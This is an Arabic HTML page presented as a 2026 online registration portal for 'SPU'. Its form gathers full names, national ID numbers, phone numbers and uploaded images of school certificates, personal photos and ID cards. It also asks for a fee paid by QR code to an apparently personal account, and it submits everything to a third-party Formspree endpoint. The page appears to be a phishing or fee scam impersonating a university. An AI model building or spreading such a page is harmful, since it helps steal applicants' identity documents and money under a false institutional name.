<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة التسجيل الإلكتروني | SPU</title>

<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">

<style>
body {
  font-family:'Tajawal', sans-serif;
  background:#f0f4f8;
}

/* Header */
.header {
  width:100%;
  height:140px;
  background:url('logo.png') center/cover no-repeat;
}

/* Animation */
@keyframes fadeInUp {
  from {opacity:0; transform:translateY(30px);}
  to {opacity:1; transform:translateY(0);}
}

.animate {
  animation:fadeInUp 0.7s ease;
}

/* Card */
.card {
  background:white;
  border-radius:20px;
  padding:30px;
  margin-top:-50px;
  box-shadow:0 20px 50px rgba(0,0,0,0.1);
  transition:0.3s;
}

.card:hover {
  transform:scale(1.01);
}

/* Inputs */
.input {
  width:100%;
  padding:12px;
  border:1px solid #ccc;
  border-radius:10px;
  margin-top:10px;
  transition:0.3s;
}

.input:focus {
  outline:none;
  transform:scale(1.02);
  box-shadow:0 0 0 2px #1e295a30;
}

/* Button */
.btn {
  background:#1e295a;
  color:white;
  padding:14px;
  border-radius:10px;
  width:100%;
  margin-top:15px;
  transition:0.3s;
}

.btn:hover {
  background:#8e1a1e;
  transform:scale(1.05);
}
</style>
</head>

<body>

<!-- Header Logo -->
<div class="header"></div>

<div class="max-w-2xl mx-auto px-4">

<div class="card animate">

<h2 class="text-2xl font-bold text-center mb-6">
📋 استمارة التسجيل الإلكتروني - 2026
</h2>

<form action="https://formspree.io/f/mqegvrjp" method="POST" enctype="multipart/form-data">

<input type="hidden" name="_next" value="success.html">

<!-- معلومات -->
<h3 class="font-bold mb-2">1. المعلومات الشخصية</h3>

<input type="text" name="name" placeholder="الاسم الكامل" class="input" required>
<input type="text" name="national" placeholder="الرقم الوطني" class="input" required>
<input type="tel" name="phone" placeholder="رقم الهاتف" class="input" required>

<select name="major" class="input" required>
<option disabled selected>اختر الكلية</option>
<option>الطب البشري</option>
<option>طب الأسنان</option>
<option>الصيدلة</option>
<option>هندسة المعلوماتية</option>
<option>هندسة الاتصالات</option>
<option>الهندسة المدنية</option>
<option>هندسة العمارة</option>
<option>إدارة الأعمال</option>
</select>

<!-- مرفقات -->
<h3 class="font-bold mt-6">2. الوثائق المطلوبة</h3>

<label>📄 صورة شهادة الثانوية</label>
<input type="file" name="cert" class="input" required>

<label>👤 صورة شخصية</label>
<input type="file" name="personal" class="input" required>

<label>🪪 صورة الهوية</label>
<input type="file" name="id" class="input" required>

<!-- الدفع -->
<h3 class="font-bold mt-6">3. الدفع</h3>

<div class="text-center bg-gray-50 p-4 rounded">

<p class="mb-2">💳 ادفع عبر QR</p>

<img src="https://i.ibb.co/JWtdDy1m/qr.png" class="w-44 mx-auto rounded shadow">

<p class="text-sm mt-2">opMustafamustafa</p>

</div>

<input type="text" name="payment" placeholder="رقم عملية التحويل" class="input" required>

<!-- Submit -->
<button type="submit" class="btn">
إرسال الطلب 🚀
</button>

<p id="loading" class="text-center mt-3 hidden">⏳ جاري الإرسال...</p>

</form>

</div>

</div>

<script>
document.querySelector("form").addEventListener("submit", ()=>{
  document.getElementById("loading").classList.remove("hidden");
});
</script>

</body>
</html>
